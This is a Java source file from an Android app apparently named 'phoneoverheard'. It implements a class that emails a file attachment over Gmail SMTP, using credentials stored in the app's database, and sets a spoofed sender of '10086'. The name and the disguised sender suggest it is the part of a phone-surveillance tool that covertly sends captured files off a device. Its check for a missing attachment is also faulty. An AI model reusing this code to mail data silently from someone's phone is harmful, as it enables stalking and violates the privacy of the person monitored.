package com.phoneoverheard.phonne;

import java.util.Date;
import java.util.Properties;
import javax.activation.CommandMap;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

public class sendEmail extends javax.mail.Authenticator{
	private static String TAG = "sendEmail"; 
	private String _user;
	private String _pass;
	private String[] _to;
	private String _from;
	WriteLog mylog = new WriteLog();
	
	public String[] get_to(){
		return _to;
	}
	public void set_to(String[] _to){
		this._to = _to;
	}
	public String get_from(){
		return _from;
	}
	public void set_from(String _from){
		this._from = _from;
	}
	public String get_subject(){
		return _subject;
	}
	public void set_subject(String _subject){
		this._subject = _subject;
	}
	private String _port;
	private String _sport;
	private String _host;
	private String _subject;
	private String _body;
	private boolean _auth;
	private boolean _debuggable;
	private Multipart _multipart;
	public sendEmail(){
		_host = "smtp.gmail.com";  
		// default smtp server 默认的STMP服务器
		_port = "465";
		// default smtp port 默认的STMP服务器发件端口
		_sport = "465";
		// default socketfactory port 默认的socketfactory发件端口
		_user = "";
		// username 用户名
		_pass = "";
		// password 密码
		_from = "";
		// email sent from 发送电子邮件
		_subject = "";
		// email subject 电子邮件主题
		_body = ""; 
		// email body 邮件内容
		_debuggable = false;
		// debug mode on or off - default off  调试模式打开或关闭，默认关闭
		_auth = true;
		// smtp authentication - default on    默认是否SMTP认证
		_multipart = new MimeMultipart();
		// There is something wrong with MailCap, javamail can not find a 
		// handler for the multipart/mixed part, so this bit needs to be added.
		//  也有一些是与MAILCAP错误，无法找到一个javamail的多重/混合部分的处理程序，所以这一点需要加以补充
		MailcapCommandMap mc = (MailcapCommandMap) CommandMap
		.getDefaultCommandMap();
		mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
		mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
		mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
		mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
		mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
		CommandMap.setDefaultCommandMap(mc);
	}

	public sendEmail(String user, String pass){
		this();
		_user = user;
		_pass = pass;
	}

	public boolean send() throws Exception{
		Properties props = _setProperties();
		if (!_user.equals("") && !_pass.equals("") && _to.length > 0 && !_from.equals("") && !_subject.equals("") && !_body.equals("")){
			Session session = Session.getInstance(props, this);
			MimeMessage msg = new MimeMessage(session);
			msg.setFrom(new InternetAddress(_from));
			InternetAddress[] addressTo = new InternetAddress[_to.length];
			for (int i = 0; i < _to.length; i++){
				addressTo[i] = new InternetAddress(_to[i]);
			}
			msg.setRecipients(MimeMessage.RecipientType.TO, addressTo);
			msg.setSubject(MimeUtility.encodeText(_subject, "GB2312", "B"));
			msg.setSentDate(new Date());
			// setup message body  设置邮件正文
			BodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setContent(_body, "text/html;charset=gb2312");
			messageBodyPart.setText(_body);
			_multipart.addBodyPart(messageBodyPart);
			// Put parts in message 设置邮件附件
			msg.setContent(_multipart);
			Log.v(TAG, "发送电子邮件=="+msg.toString());
			mylog.WrLog("i",TAG,"发送电子邮件=="+msg.toString());
			// send email 发送电子邮件
			Transport.send(msg);
			return true;
		}else{
			return false;
		}
	}

	public void addAttachment(String filename) throws Exception{
		BodyPart messageBodyPart = new MimeBodyPart();
		DataSource source = new FileDataSource(filename);
		messageBodyPart.setDataHandler(new DataHandler(source));
		messageBodyPart.setFileName(MimeUtility.encodeText(_subject, "GB2312","B"));
		_multipart.addBodyPart(messageBodyPart);
	}

	public PasswordAuthentication getPasswordAuthentication(){
		return new PasswordAuthentication(_user, _pass);
	}

	private Properties _setProperties(){
		Properties props = new Properties();
		props.put("mail.smtp.host", _host);
		if (_debuggable){
			props.put("mail.debug", "true");
		}
		if (_auth){
			props.put("mail.smtp.auth", "true");
		}
		props.put("mail.smtp.port", _port);
		props.put("mail.smtp.socketFactory.port", _sport);
		props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.socketFactory.fallback", "false");
		return props;
	}

	// the getters and setters
	public String getBody(){
		return _body;
	}

	public void setBody(String _body){
		this._body = _body;
	}

	@SuppressLint("SdCardPath")
	public void sendEmailTo(String mailsubject,String mailbody,String sendfileurl,String mailto,Context context){
		ManagerService managerservice = new ManagerService(context);
		Manager manager = managerservice.find("manager");
		sendEmail m = new sendEmail( manager.getMailfrom(), manager.getMailpassword());  //发件人，sendEmail(用户名、密码)
	    String[] toArr = {mailto};  //收件人；数组可以设置多个收件人
	    m.set_to(toArr);  
	    m.set_from("10086"); 
	    m.set_subject(mailsubject);  //邮件标题
	    m.setBody(mailbody);    //设置邮件正文
	    try {  
	    	if(sendfileurl!=null||!"".equals(sendfileurl)){
	    		m.addAttachment(sendfileurl);  //设置附件
	    	}
	        if (m.send()) {
	        	//Email发送成功
	        }else{
	        	//Email发送失败
	        }  
	
	    }catch (Exception e) {  
	       Log.e(TAG, "Email发送失败");  
	       mylog.WrLog("i",TAG,"Email发送失败");
	    }  
	}
	
	
}